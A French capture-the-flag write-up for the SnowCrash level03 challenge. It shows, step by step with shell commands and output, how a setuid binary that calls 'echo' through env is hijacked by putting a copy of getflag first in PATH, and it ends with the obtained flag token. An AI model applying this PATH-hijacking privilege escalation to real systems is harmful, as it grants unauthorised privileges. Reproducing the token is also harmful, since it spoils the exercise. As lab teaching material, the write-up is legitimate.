Nous avons un executable qui appartient a flag03:

`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03 `

```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

Rien d'interessant ici

Nous faisons plusieurs manipulations:

- hexdump => Rien d'exploitable
- strace => Rien d'interessant a part
```
getegid32() = 2003
geteuid32() = 2003
```

getegid32 correspond au group id
geteuid32 correspond au user id
Ces 2 id corresponde a l'id level03, le user sur lequel nous sommes.

Ensuite il y a des appels a
`setresgid32` et `setresuid32` qui ne retourne pas d'erreur

Dans l'appel qui ecrit `Exploit me` on voit 2442, mais cet id ne correspond a aucun utilisateur
```bash
cat /etc/passwd | grep 2442
```

Nous utilisons [strings](https://linux.die.net/man/1/strings) afin d'afficher les caracteres affichable du binaire level03

Nous voyons ici que l'executable var chercher dans l'env l'appel echo:
`/usr/bin/env echo Exploit me`

Nous nous disons que nous pouvons exploiter ceci en faisant executer `getflag` depuis ce binaire.

```bash
level03@SnowCrash:~$ env
...
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
...

level03@SnowCrash:~$ whereis getflag
getflag: /bin/getflag

level03@SnowCrash:~$ whereis echo
echo: /bin/echo /usr/share/man/man1/echo.1.gz

level03@SnowCrash:~$ mkdir /tmp/exploit

level03@SnowCrash:~$ cp /bin/getflag /tmp/exploit/echo
```

On peut bien lancer getflag avec un appel `echo` d'un autre PATH:
```bash
level03@SnowCrash:~$ /tmp/exploit/echo
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

On ajoute notre /tmp/exploit au PATH: [Procedure](https://geekeries.de-labrusse.fr/?p=2790)

```bash
level03@SnowCrash:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$ export PATH=$PATH:/tmp/exploit
```

Le path a bien ete update mais ce n'est toujours pas le bon appel a `echo`

```bash
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp/exploit
```

Nous essayons de modifier l'ordre du PATH, grace a ce [stackoverflow](https://stackoverflow.com/questions/32170798/how-do-i-change-the-order-of-path)
```bash
level03@SnowCrash:~$ export PATH=/tmp/exploit:$PATH
level03@SnowCrash:~$ echo $PATH
/tmp/exploit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp/exploit
```

Et la ca fonctionne !!!

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```